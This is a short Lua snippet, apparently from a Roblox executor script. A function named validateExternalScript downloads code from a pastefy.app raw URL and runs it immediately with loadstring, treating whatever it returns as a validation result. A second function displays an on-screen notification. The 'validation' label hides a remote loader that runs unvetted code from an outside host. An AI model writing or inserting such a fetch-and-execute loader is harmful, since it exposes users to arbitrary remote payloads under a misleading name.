local function validateExternalScript()
    local Url = "https://pastefy.app/w5NPPtOB/raw"
    local success, result = pcall(function() return game:HttpGet(Url) end)
    if success then
        local isValid, scriptResult = pcall(function()
            return loadstring(result)()
        end)
        if isValid and scriptResult == true then
            return true
        end
    end
    return false
end

local function showNotification(title, message, icon)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = title,
        Text = message,
        Icon = icon or "",
        Duration = 5,
    })
end

